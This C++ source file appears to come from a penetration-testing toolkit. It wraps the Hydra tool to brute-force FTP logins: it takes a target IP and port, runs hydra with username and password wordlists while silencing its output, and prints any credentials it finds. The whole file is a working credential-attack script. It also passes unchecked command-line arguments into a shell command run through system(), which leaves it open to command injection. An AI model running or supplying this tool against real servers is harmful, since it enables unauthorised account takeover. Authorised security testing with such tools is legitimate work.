#include "terminal_colours.h"
#include "standard_paths.h"

int main(int argc, char **argv) {

  // if user input is incorrect
  if (argc != 3) {
	  std::cout << "Usage: ./hydra_ftp <ip address> <port>";
	  return 0;
  }

  // take CLI arguments 1 and 2 and assign to ip_address and port for command usage
  std::string ip_address, port;
  std::stringstream args_conv;
  args_conv << argv[1] << " " << argv[2];
  args_conv >> ip_address >> port;

  // display text for user confirming input
  std::cout << "\n\t\t\t***Initiating Hydra FTP Scan***\t\t\t\n\n" << "Target IP:\t" << ip_address << "\n" << "Target Port:\t" << port << std::endl;

  // assign path to results variable
  std::stringstream result_conv;
  result_conv << rsltpth << ip_address << "_brute_ftp.txt";
  std::string results = result_conv.str();

  // assign hydra command to variable, pipe stdout/stderr to /dev/null
  std::stringstream hydra_conv;
  hydra_conv << "hydra -L " << usrlst << " -P " << pwdlst << " -f -o " << results <<" -u " << ip_address << " -s " << port << " ftp > /dev/null 2>&1";
  std::string hydra = hydra_conv.str();

  // system call, run hydra
  std::system(hydra.c_str());

  // read results file line by line to find credentials, output then exit
  std::string line;
  std::ifstream infile(results.c_str());
  while (std::getline(infile, line)) {

 	  if (line.find("login:") != std::string::npos) {
	    std::cout << BOLDCYAN << line << std::endl;
      return 0;
  	}

  }
 
  // result loop exited, no credentials found  
  std::cout << BOLDRED << "No valid FTP credentials found" << std::endl;
}
